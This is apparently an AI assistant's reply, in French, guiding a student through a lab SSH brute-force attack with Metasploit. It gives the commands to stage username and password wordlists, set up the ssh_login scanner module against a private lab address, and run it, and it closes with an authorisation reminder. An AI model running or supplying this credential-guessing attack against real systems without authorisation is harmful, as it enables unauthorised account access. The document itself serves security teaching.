Merci d'avoir partagé votre document et vos progrès ! Il semble que vous ayez trouvé un répertoire accessible par Metasploit, ce qui est un excellent pas en avant. Maintenant que vous avez identifié un répertoire où Metasploit peut accéder aux fichiers nécessaires, vous pouvez procéder à la configuration de vos attaques, notamment la connexion SSH.

Voici comment vous pouvez procéder pour utiliser Metasploit afin de vous connecter via SSH en utilisant les fichiers de noms d'utilisateurs et de mots de passe que vous avez préparés :

### Étape 1: Déplacement des fichiers dans le répertoire accessible
Puisque Metasploit a accès au répertoire `/snap/metasploit-framework/`, déplacez vos fichiers `usernames.txt` et `passwords.txt` dans ce répertoire.

1. **Déplacez les fichiers**:
   ```bash
   sudo mv /home/eleve/usernames.txt /snap/metasploit-framework/
   sudo mv /home/eleve/passwords.txt /snap/metasploit-framework/
   ```

2. **Assurez-vous que les fichiers sont dans le bon répertoire**:
   ```bash
   ls -l /snap/metasploit-framework/usernames.txt
   ls -l /snap/metasploit-framework/passwords.txt
   ```

### Étape 2: Configuration de Metasploit
Démarrez Metasploit et configurez-le pour utiliser les fichiers dans le nouveau répertoire.

1. **Lancez Metasploit**:
   ```bash
   msfconsole
   ```

2. **Configurez le module de scanner SSH**:
   ```bash
   use auxiliary/scanner/ssh/ssh_login
   set RHOSTS 172.28.128.3
   set USER_FILE /snap/metasploit-framework/usernames.txt
   set PASS_FILE /snap/metasploit-framework/passwords.txt
   set VERBOSE true
   ```

### Étape 3: Exécution du Module
Maintenant que tout est configuré, vous pouvez lancer le module pour tenter de vous connecter via SSH.

```bash
run
```

Cela lancera l'attaque par force brute en utilisant les noms d'utilisateurs et mots de passe que vous avez spécifiés. Gardez un œil sur la sortie de la console pour voir si des identifiants valides sont trouvés.

### Conseils de Sécurité
- **Permissions**: Assurez-vous que les permissions des fichiers sont correctes pour éviter l'accès non autorisé.
- **Légalité**: Confirmez que vous avez l'autorisation de tester la machine cible. L'utilisation de ces outils sur des réseaux ou des machines sans consentement est illégale.

Avec ces étapes, vous devriez être en mesure de réaliser votre test de pénétration SSH avec Metasploit. Si vous rencontrez des problèmes, n'hésitez pas à vérifier les logs de Metasploit pour plus d'informations sur les erreurs éventuelles.
